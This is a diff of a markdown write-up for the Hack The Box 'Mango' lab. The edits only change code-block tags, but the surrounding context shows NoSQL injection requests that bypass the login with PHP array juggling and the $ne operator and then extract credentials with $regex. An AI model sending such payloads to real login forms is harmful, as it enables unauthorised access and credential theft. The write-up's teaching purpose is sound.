@@ -77,7 +77,7 @@ Lets check the web page:
 ![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/mango-admin-portal.png?raw=true)
 
 
-
+****
 The first thing we try is sqli injection with burp but not work So I come back and learn something about NoSQLI injection. 
 
 ## NoSQL 101 for dumbs
@@ -108,7 +108,7 @@ $pass->find_password(array(
 
 After a bit of research in this [links](##Reference-Links) I can understanding how deal with that. The site is running php, so we can use **Type Juggling**. This can be done send a **"[]"**  which makes **PHP** interpret and use them like a array. Why that is so important ? Because can be used to  bypass authentication mechanism, if the code of this comparison have some failure:
 
-```php+HTML
+```php
 POST / HTTP/1.1
 Host: staging-order.mango.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -127,7 +127,7 @@ username[]=admin&password[]=admin&login=login
 
 We send a **array** to application and not receive anything different as usual. Now we make a use of **$ne**. This operator is used to **mango db** to compare values. So lets try it:
 
-```php+HTML
+```php
 POST / HTTP/1.1
 Host: staging-order.mango.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -146,7 +146,7 @@ username=admin&password[$ne]=admin&login=login
 
 
 
-```php+HTML
+```php
 HTTP/1.1 302 Found
 Date: Fri, 24 Apr 2020 22:50:29 GMT
 Server: Apache/2.4.29 (Ubuntu)
@@ -170,7 +170,7 @@ So, we achieve a 302 code.
 
 For now we achieve a **NoSQLI** injection but this not give us anything to useful in your path to pop a shell. For this task we use python script to fuzz the username and passwords. The main idea is use the  **$regex** operator to ex filtrate data:
 
-```php+HTML
+```php
 POST /index.php HTTP/1.1
 Host: staging-order.mango.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -189,7 +189,7 @@ username[$regex]=a.*&password[$ne]=admin&login=login
 
 The username and password sentence ca be translated this way - " If have a user that beginning with letter 'a' and the password not equal  ```admin```. Sent this we receive a 302 code (redirect):
 
-```php+HTML
+```php
 HTTP/1.1 302 Found
 Date: Sat, 25 Apr 2020 00:29:03 GMT
 Server: Apache/2.4.29 (Ubuntu)
@@ -204,7 +204,7 @@ Content-Type: text/html; charset=UTF-8
 
 If we change the the request wit user name to something like that :
 
-```php+HTML
+```php
 username[$regex]=b.*&password[$ne]=admin&login=login
 ```
 
